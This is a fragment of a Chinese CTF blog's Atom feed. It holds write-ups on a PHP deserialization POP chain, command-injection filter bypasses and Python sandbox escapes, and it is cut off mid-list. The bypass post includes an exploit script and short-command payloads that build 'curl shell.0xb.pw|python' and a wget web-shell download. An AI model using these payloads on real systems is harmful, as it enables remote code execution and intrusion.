class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Routing</span>\<span class="title">Loader</span>\<span class="title">Configurator</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">ImportConfigurator</span> &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">parent</span>;</span><br><span class="line">        <span class="keyword">private</span> $route;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($parent)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parent = $parent;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;route = <span class="string">"cat /flag"</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span> &#123;</span><br><span class="line"> <span class="title">class</span> <span class="title">Generator</span> &#123;</span><br><span class="line"> <span class="title">protected</span> $<span class="title">formatters</span> = <span class="title">array</span>();</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($formatters)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> <span class="keyword">$this</span>-&gt;formatters = $formatters;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line"> $<span class="title">a</span> = <span class="title">new</span> <span class="title">Faker</span>\<span class="title">Generator</span>(<span class="title">array</span>("<span class="title">addCollection</span>" =&gt; "<span class="title">system</span>"));</span><br><span class="line"> $b = <span class="keyword">new</span></span><br><span class="line">Symfony\Component\Routing\Loader\Configurator\ImportConfigurator($a);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">echo</span> urlencode(serialize($b));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      摸鱼
    
    </summary>
    
    
      <category term="CTF" scheme="https://0xcreed.jxustctf.top/categories/CTF/"/>
    
    
      <category term="WEB" scheme="https://0xcreed.jxustctf.top/tags/WEB/"/>
    
      <category term="WP" scheme="https://0xcreed.jxustctf.top/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>记一次学校的内网漫游</title>
    <link href="https://0xcreed.jxustctf.top/2020/06/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AD%A6%E6%A0%A1%E7%9A%84%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8/"/>
    <id>https://0xcreed.jxustctf.top/2020/06/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AD%A6%E6%A0%A1%E7%9A%84%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8/</id>
    <published>2020-06-17T16:05:43.000Z</published>
    <updated>2020-06-22T06:17:00.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="2706c09d50f1b81254cde7910bae439a8bf11e165a8bf0bcbcce1f1116625824"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      免费给学校做的一次渗透测试
    
    </summary>
    
    
      <category term="内网" scheme="https://0xcreed.jxustctf.top/categories/%E5%86%85%E7%BD%91/"/>
    
    
      <category term="内网渗透" scheme="https://0xcreed.jxustctf.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="实战" scheme="https://0xcreed.jxustctf.top/tags/%E5%AE%9E%E6%88%98/"/>
    
  </entry>
  
  <entry>
    <title>命令执行与绕过</title>
    <link href="https://0xcreed.jxustctf.top/2020/06/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E7%BB%95%E8%BF%87/"/>
    <id>https://0xcreed.jxustctf.top/2020/06/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E7%BB%95%E8%BF%87/</id>
    <published>2020-06-10T07:03:32.000Z</published>
    <updated>2020-06-10T10:11:54.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-空格绕过"><a href="#1-空格绕过" class="headerlink" title="1.空格绕过"></a>1.空格绕过</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;cat,flag.txt&#125;</span><br><span class="line">cat<span class="variable">$&#123;IFS&#125;</span>flag.txt</span><br><span class="line">cat<span class="variable">$IFS</span><span class="variable">$9flag</span>.txt</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line">kg=$<span class="string">'\x20flag.txt'</span>&amp;&amp;cat<span class="variable">$kg</span>  //(\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)</span><br></pre></td></tr></table></figure><a id="more"></a><p>$IFS在linux下表示分隔符，加一个{}就固定了变量名，同理在后面加个$可以起到截断作用。</p><h2 id="2-命令分割符"><a href="#2-命令分割符" class="headerlink" title="2.命令分割符"></a>2.命令分割符</h2><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">0</span>a 换行符</span><br><span class="line">%<span class="number">0</span>d 回车符</span><br><span class="line">; 表示连续指令</span><br><span class="line"><span class="meta">&amp; 表示将前一个命令设置进入后台</span></span><br><span class="line"><span class="string">| 管道符，将前一个命令的输出作为后一个命令的输入</span></span><br><span class="line"><span class="meta">&amp;&amp; 前一个命令执行成功才会执行下一条命令</span></span><br><span class="line"><span class="string">|| 前一个命令执行失败才会执行下一条命令</span></span><br></pre></td></tr></table></figure><h2 id="3-黑名单绕过"><a href="#3-黑名单绕过" class="headerlink" title="3.黑名单绕过"></a>3.黑名单绕过</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=l;b=s;<span class="variable">$a</span><span class="variable">$b</span>  //变量绕过</span><br><span class="line">`<span class="built_in">echo</span> <span class="string">"bHMK"</span> |base64 -d` //base64编码</span><br></pre></td></tr></table></figure><h2 id="4-短命令执行"><a href="#4-短命令执行" class="headerlink" title="4.短命令执行"></a>4.短命令执行</h2><p>大体上的想法就是通过重命名文件绕过，然后通过<code>ls</code>来将文件名写入到文件中，<code>&gt;</code>这个重定向符号可以来创建文件，其中文件名是<code>&gt;</code>后面跟的参数，然后创建出我们精心构造好的多个文件名，然后通过<code>ls</code>打印出来再重定向<code>&gt;</code>到一个木马文件中，就可以执行了</p><ul><li><h3 id="拼接方法"><a href="#拼接方法" class="headerlink" title="拼接方法"></a>拼接方法</h3></li></ul><ol><li>两个反斜杠<code>\\</code>，这种方法是利用<code>\</code>来拼接字符串，其中前一个<code>\</code>是用来反义后一个<code>\</code>的。这种方法的话需要精心构造输入，利用倒叙来输入，然后<code>ls</code>的时候需要加<code>-t</code>参数来排列一下，虽然报错了但是也执行成功了</li></ol><p><img src="/2020/06/命令执行与绕过/image-20200610155026769.png" alt="image-20200610155026769"></p><ul><li><h4 id="七字绕过"><a href="#七字绕过" class="headerlink" title="七字绕过"></a>七字绕过</h4></li></ul><p>题目源码如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(strlen($_GET[<span class="number">1</span>])&lt;<span class="number">8</span>)&#123;</span></span><br><span class="line"><span class="php">     <span class="keyword">echo</span> shell_exec($_GET[<span class="number">1</span>]);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;php<span class="string">\\</span></span><br><span class="line">&gt;ell.<span class="string">\\</span></span><br><span class="line">&gt;<span class="string">\</span> sh<span class="string">\\</span></span><br><span class="line">&gt;<span class="string">\</span> -O<span class="string">\\</span></span><br><span class="line">&gt;com<span class="string">\\</span></span><br><span class="line">&gt;idu.<span class="string">\\</span></span><br><span class="line">&gt;<span class="string">\</span> ba<span class="string">\\</span></span><br><span class="line">&gt;wget<span class="string">\\</span></span><br><span class="line">ls -t&gt;a</span><br><span class="line">sh a</span><br></pre></td></tr></table></figure><p><img src="/2020/06/命令执行与绕过/image-20200610172713846.png" alt="image-20200610172713846"></p><ul><li><h4 id="五字绕过"><a href="#五字绕过" class="headerlink" title="五字绕过"></a>五字绕过</h4></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sandbox = <span class="string">'/www/sandbox/'</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">        @exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">        @exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>因为长度要小于5，所以我们无法执行<code>ls -t&gt;a</code></p><p>所以思路是先构造 <code>ls -t&gt;a</code></p><p>exp</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"><span class="built_in">from</span> <span class="built_in">time</span> import sleep</span><br><span class="line"><span class="built_in">from</span> urllib import <span class="literal">quote</span></span><br><span class="line">payload = [</span><br><span class="line">    <span class="comment"># generate `ls -t&gt;g` file</span></span><br><span class="line">    <span class="string">'&gt;ls\\'</span>, </span><br><span class="line">    <span class="string">'ls&gt;_'</span>, </span><br><span class="line">    <span class="string">'&gt;\ \\'</span>, </span><br><span class="line">    <span class="string">'&gt;-t\\'</span>, </span><br><span class="line">    <span class="string">'&gt;\&gt;g'</span>, </span><br><span class="line">    <span class="string">'ls&gt;&gt;_'</span>, </span><br><span class="line">    <span class="comment"># generate `curl orange.tw.tw&gt;python`</span></span><br><span class="line">    <span class="comment"># curl shell.0xb.pw|python</span></span><br><span class="line">    <span class="string">'&gt;on'</span>, </span><br><span class="line">    <span class="string">'&gt;th\\'</span>, </span><br><span class="line">    <span class="string">'&gt;py\\'</span>,</span><br><span class="line">    <span class="string">'&gt;\|\\'</span>, </span><br><span class="line">    <span class="string">'&gt;pw\\'</span>, </span><br><span class="line">    <span class="string">'&gt;x.\\'</span>,</span><br><span class="line">    <span class="string">'&gt;xx\\'</span>, </span><br><span class="line">    <span class="string">'&gt;l.\\'</span>, </span><br><span class="line">    <span class="string">'&gt;el\\'</span>, </span><br><span class="line">    <span class="string">'&gt;sh\\'</span>, </span><br><span class="line">    <span class="string">'&gt;\ \\'</span>, </span><br><span class="line">    <span class="string">'&gt;rl\\'</span>, </span><br><span class="line">    <span class="string">'&gt;cu\\'</span>, </span><br><span class="line">    <span class="comment"># exec</span></span><br><span class="line">    <span class="string">'sh _'</span>, </span><br><span class="line">    <span class="string">'sh g'</span>, </span><br><span class="line">]</span><br><span class="line">r = requests.<span class="built_in">get</span>(<span class="string">'http://xxx/web1.php/?reset=1'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    assert <span class="built_in">len</span>(i) &lt;= <span class="number">5</span> </span><br><span class="line">    r = requests.<span class="built_in">get</span>(<span class="string">'http://xxx/web1.php/?cmd='</span> + <span class="literal">quote</span>(i) )</span><br><span class="line">    print i</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br></pre></td></tr></table></figure><ul><li><h4 id="四字绕过"><a href="#四字绕过" class="headerlink" title="四字绕过"></a>四字绕过</h4></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sandbox = <span class="string">'/www/sandbox/'</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">4</span>) &#123;</span><br><span class="line">        @exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">        @exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>最大的问题还是<code>ls -t&gt;g</code>这个问题</p><p><img src="/2020/06/命令执行与绕过/image-20200610180226760.png" alt="image-20200610180226760"></p><p>这个exp的构造非常的细致</p><p>首先是 <code>ht-</code>加了个 <code>h</code>参数但效果和 <code>-t</code>一样 但可以让 <code>ht-</code>排在<code>sl</code>前面</p><p>选择<code>dir</code>列目录，<code>dir</code>排在第一位，<code>*</code>直接会执行<code>dir</code>命令</p><p>之后 <code>rev</code>逆序文件。</p><p>后面都是一样的就不讲了</p>]]></content>
    
    <summary type="html">
    
      最近刷题刷到命令绕过的题，但好多知识好久没用忘了。做个记录
    
    </summary>
    
    
      <category term="CTF" scheme="https://0xcreed.jxustctf.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://0xcreed.jxustctf.top/tags/CTF/"/>
    
      <category term="绕过" scheme="https://0xcreed.jxustctf.top/tags/%E7%BB%95%E8%BF%87/"/>
    
      <category term="命令执行" scheme="https://0xcreed.jxustctf.top/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>python_web学习</title>
    <link href="https://0xcreed.jxustctf.top/2020/06/python-web%E5%AD%A6%E4%B9%A0/"/>
    <id>https://0xcreed.jxustctf.top/2020/06/python-web%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-06-09T08:31:41.000Z</published>
    <updated>2021-03-18T11:21:18.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-沙箱逃逸"><a href="#1-沙箱逃逸" class="headerlink" title="1.沙箱逃逸"></a>1.沙箱逃逸</h2><p>Python 的沙箱逃逸的最终目标就是执行系统任意命令，次一点的写文件，再次一点的读文件。测试环境是 <code>python3.8.2</code>,<code>py3.x</code>各个版本间有一些差异，但总体的方法不变。py2就不讨论了</p><ul><li><h4 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a><strong>执行系统命令</strong></h4>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">os.system(<span class="string">"whoami"</span>)</span><br><span class="line">os.popen(<span class="string">"whoami"</span>).read()</span><br><span class="line">subprocess.run(<span class="string">"whoami"</span>,shell=<span class="literal">True</span>) //如果 shell 设为 <span class="literal">True</span>,命令是被Bash(Sh)启动，所以支持shell语法。 如果shell=<span class="literal">False</span>的话，启动的是可执行程序本身，后面的参数不再支持shell语法。</span><br><span class="line">subprocess.Popen(<span class="string">"whoami"</span>,shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.call(<span class="string">"whoami"</span>,shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.check_call(<span class="string">"whoami"</span>,shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.check_output(<span class="string">"whoami"</span>,shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.getstatusoutput(<span class="string">"whoami"</span>)</span><br></pre></td></tr></table></figure><p>  执行系统命令只有 <code>os</code> <code>subprocess</code></p></li><li><h4 id="执行Python代码"><a href="#执行Python代码" class="headerlink" title="执行Python代码"></a><strong>执行Python代码</strong></h4>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eval(expression[, globals[, locals]]) //实参是一个字符串，以及可选的 globals 和 locals。globals 实参必须是一个字典。locals 可以是任何映射对象。</span><br><span class="line">exec(object[, globals[, locals]])  //这个函数支持动态执行 Python 代码。object 必须是字符串或者代码对象。<span class="keyword">exec</span>函数的返回值永远为<span class="literal">None</span>。</span><br><span class="line">f-string</span><br></pre></td></tr></table></figure>  <figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exec('import os <span class="comment">;os.system("whoami")')</span></span><br><span class="line">eval('__import__(<span class="string">"os"</span>).system(<span class="string">"whoami"</span>)')</span><br><span class="line">f'&#123;__import__(<span class="string">"os"</span>).system(<span class="string">"whoami"</span>)&#125;' //F'&#123;__import__(<span class="string">"os"</span>).system(<span class="string">"whoami"</span>)&#125;'</span><br></pre></td></tr></table></figure><p>  这两个函数是内置函数。</p><p>  大体上就是 <code>执行python代码 -&gt; 执行系统命令</code></p></li><li><h4 id="关键方法"><a href="#关键方法" class="headerlink" title="关键方法"></a><strong>关键方法</strong></h4></li></ul><a id="more"></a><p><code>__init__</code> 类的实例化</p><p><code>__base__</code> 列出其基类。<code>__base__</code> 和 <code>__bases__</code>都是返回当前类的基类，只不过<code>__bases__</code>返回的是一个元祖</p><p><code>__mro__</code> 递归显示其父类直到object</p><p><code>__subclasses__()[]</code> 获取子类</p><p><code>__class__</code> 获得当前对象的类</p><p><code>object.__getattribute__(self, name)</code> 此方法会无条件地被调用以实现对类实例属性的访问。</p><p><code>__globals__</code>   <code>function.__globals__</code> 等同于globals()。dir() 的结果是上面两个的键值</p><p><code>&#39;&#39;.__class__.__mro__[1].__subclasses__()[138].__init__.__getattribute__(&quot;__globals__&quot;)</code>  //<code>os._wrap_close</code>类</p><p><code>__dir__</code> 一个字典或其他类型的映射对象，用于存储对象的（可写）属性。</p><pre><code>&gt;&gt;&gt; &apos;&apos;.__class__.__dict__[&apos;upper&apos;]&lt;method &apos;upper&apos; of &apos;str&apos; objects&gt;&gt;&gt;&gt; &apos;&apos;.__class__.upper&lt;method &apos;upper&apos; of &apos;str&apos; objects&gt;</code></pre><p><code>__import__</code> <code>import</code>一个模块</p><p><code>bulitins</code>  Python3的内建模块，该内建模块中的功能可以直接使用，不用在其前添加内建模块前缀</p><pre><code>import builtinsdir(builtins) //打印所有的内联函数可获取eval exec</code></pre><p><code>__builtins__</code> <code>builtins</code> 的引用 <code>__builtins__.__dict__[&#39;__import__&#39;](&#39;os&#39;).system(&#39;whoami&#39;)</code></p><p><code>__name__</code> 个值获得的只是一个字符串，不是模块的引用，使用<code>sys.modules[__name__]</code> 才获得的是模块的引用<br>        <code>__call__(self[, args...])</code> 此方法会在实例作为一个函数被“调用”时被调用；如果定义了此方法，则 <code>x(arg1, arg2, ...)</code> 就相当于 <code>x.__call__(arg1, arg2, ...)</code></p><p><code>().__class__.__bases__[0].__subclasses__()[37].__call__(exec,&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;)</code></p><p><code>dir()</code> 将显示对象的属性的名称，<code>__dict__</code>是dir()的子集。注意<a href="https://docs.python.org/zh-cn/3/library/functions.html#dir" target="_blank" rel="noopener"><code>dir()</code></a> 不会列出内置函数和变量的名称</p><p><code>getattr(object, name[, default])</code>  返回对象命名属性的值。<em>name</em> 必须是字符串。如果该字符串是对象的属性之一，则返回该属性的值。例如， <code>getattr(x, &#39;foobar&#39;)</code> 等同于 <code>x.foobar</code> 可以用这个特性绕过 <code>.</code> 被过滤的情况</p><p><code>pickle</code> 这个是python 的一个序列化的方法，用于将对象存储在字符串对象中，实现对象的持久化。</p><p>​     <code>pickle.loads(b&quot;cos\nsystem\n(S&#39;ls&#39;\ntR.&quot;) //执行命令</code></p><p><code>timeit模块</code> 测试代码的执行时间的<br>            <code>timeit.timeit(&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;,number=1)</code></p><p><code>importlib模块</code> </p><p>​    <code>find_loader</code>用来查找模块，<code>reload</code>重新载入模块<code>importlib.import_module(name, package=None)</code>充当<code>importlib.__import__()</code>的简化包装。</p><ul><li><h4 id="import-导入机制"><a href="#import-导入机制" class="headerlink" title="import 导入机制"></a>import 导入机制</h4><p>  <img src="/2020/06/python-web学习/9113969-e5945487b84c3721.png" alt="9113969-e5945487b84c3721"></p></li></ul><p>所以说如果导入的模块a中有着另一个模块b，那么，我们可以用a.b的方法或者<code>a.__dict__[b&lt;name&gt;]</code>的方法间接访问模块b。</p><p>顺着这个思路，我们可以FUZZ一下哪些模块 <code>import</code> <code>os</code>和<code>subprocess</code>从而执行系统命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查询手册合成的标准库字典</span></span><br><span class="line"><span class="comment">#第三方库也是同样fuzz的</span></span><br><span class="line">all_modules3=[<span class="string">'string'</span>, <span class="string">'re'</span>, <span class="string">'difflib'</span>, <span class="string">'textwrap'</span>, <span class="string">'unicodedata'</span>, <span class="string">'stringprep'</span>, <span class="string">'readline'</span>, <span class="string">'rlcompleter'</span>, <span class="string">'struct'</span>, <span class="string">'codecs'</span>, <span class="string">'datetime'</span>, <span class="string">'calendar'</span>, <span class="string">'collections'</span>, <span class="string">'heapq'</span>, <span class="string">'bisect'</span>, <span class="string">'array'</span>, <span class="string">'weakref'</span>, <span class="string">'types'</span>, <span class="string">'copy'</span>, <span class="string">'pprint'</span>, <span class="string">'reprlib'</span>, <span class="string">'enum'</span>, <span class="string">'numbers'</span>, <span class="string">'math'</span>, <span class="string">'cmath'</span>, <span class="string">'decimal'</span>, <span class="string">'fractions'</span>, <span class="string">'random'</span>, <span class="string">'statistics'</span>, <span class="string">'itertools'</span>, <span class="string">'functools'</span>, <span class="string">'operator'</span>, <span class="string">'pathlib'</span>, <span class="string">'fileinput'</span>, <span class="string">'stat'</span>, <span class="string">'filecmp'</span>, <span class="string">'tempfile'</span>, <span class="string">'glob'</span>, <span class="string">'fnmatch'</span>, <span class="string">'linecache'</span>, <span class="string">'shutil'</span>, <span class="string">'pickle'</span>, <span class="string">'copyreg'</span>, <span class="string">'shelve'</span>, <span class="string">'marshal'</span>, <span class="string">'dbm'</span>, <span class="string">'sqlite3'</span>, <span class="string">'zlib'</span>, <span class="string">'gzip'</span>, <span class="string">'bz2'</span>, <span class="string">'lzma'</span>, <span class="string">'zipfile'</span>, <span class="string">'tarfile'</span>, <span class="string">'csv'</span>, <span class="string">'configparser'</span>, <span class="string">'netrc'</span>, <span class="string">'xdrlib'</span>, <span class="string">'plistlib'</span>, <span class="string">'hashlib'</span>, <span class="string">'hmac'</span>, <span class="string">'secrets'</span>, <span class="string">'os'</span>, <span class="string">'io'</span>, <span class="string">'time'</span>, <span class="string">'argparse'</span>, <span class="string">'getopt'</span>, <span class="string">'logging'</span>, <span class="string">'getpass'</span>, <span class="string">'curses'</span>, <span class="string">'platform'</span>, <span class="string">'errno'</span>, <span class="string">'ctypes'</span>, <span class="string">'threading'</span>, <span class="string">'multiprocessing'</span>, <span class="string">'concurrent'</span>, <span class="string">'subprocess'</span>, <span class="string">'sched'</span>, <span class="string">'queue'</span>, <span class="string">'_thread'</span>, <span class="string">'_dummy_thread'</span>, <span class="string">'dummy_threading'</span>, <span class="string">'contextvars'</span>, <span class="string">'asyncio'</span>, <span class="string">'socket'</span>, <span class="string">'ssl'</span>, <span class="string">'select'</span>, <span class="string">'selectors'</span>, <span class="string">'asyncore'</span>, <span class="string">'asynchat'</span>, <span class="string">'signal'</span>, <span class="string">'mmap'</span>, <span class="string">'email'</span>, <span class="string">'json'</span>, <span class="string">'mailcap'</span>, <span class="string">'mailbox'</span>, <span class="string">'mimetypes'</span>, <span class="string">'base64'</span>, <span class="string">'binhex'</span>, <span class="string">'binascii'</span>, <span class="string">'quopri'</span>, <span class="string">'uu'</span>, <span class="string">'xml'</span>, <span class="string">'webbrowser'</span>, <span class="string">'cgi'</span>, <span class="string">'cgitb'</span>, <span class="string">'wsgiref'</span>, <span class="string">'urllib'</span>, <span class="string">'http'</span>, <span class="string">'ftplib'</span>, <span class="string">'poplib'</span>, <span class="string">'imaplib'</span>, <span class="string">'nntplib'</span>, <span class="string">'smtplib'</span>, <span class="string">'smtpd'</span>, <span class="string">'telnetlib'</span>, <span class="string">'uuid'</span>, <span class="string">'socketserver'</span>, <span class="string">'xmlrpc'</span>, <span class="string">'ipaddress'</span>, <span class="string">'audioop'</span>, <span class="string">'aifc'</span>, <span class="string">'sunau'</span>, <span class="string">'wave'</span>, <span class="string">'chunk'</span>, <span class="string">'colorsys'</span>, <span class="string">'imghdr'</span>, <span class="string">'sndhdr'</span>, <span class="string">'ossaudiodev'</span>, <span class="string">'gettext'</span>, <span class="string">'locale'</span>, <span class="string">'turtle'</span>, <span class="string">'cmd'</span>, <span class="string">'shlex'</span>, <span class="string">'tkinter'</span>, <span class="string">'typing'</span>, <span class="string">'pydoc'</span>, <span class="string">'doctest'</span>, <span class="string">'unittest'</span>, <span 